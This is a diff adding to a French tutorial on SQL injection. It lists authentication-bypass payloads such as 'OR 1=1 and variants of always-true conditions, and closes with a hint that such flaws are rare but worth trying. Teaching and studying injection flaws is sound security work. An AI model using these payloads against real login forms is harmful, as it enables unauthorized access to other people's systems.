@@ -57,6 +57,26 @@ password = 'password' or 1=1;--;
 
 Et qui de ce fait, rend totalement inutile la condition password='anto' vu que la condition 1=1 sera toujours vraie.
 
+Il existe une infinité de conditions triviales, par exemple :
+
+```sql
+'='
+'OR 1=1
+'OR a=a
+'OR'
+'OR''='
+'OR"="
+'OR'="
+'OR '="
+'OR "='
+'OR ''='
+'OR '=''
+'OR "=''
+'OR ''="
+```
+
+
+
 {% hint style="warning" %}
 Malheureusement pour nous, ces genres de vulnérabilités sont extrêmement rares, mais valent le coup d'être essayés.
 {% endhint %}
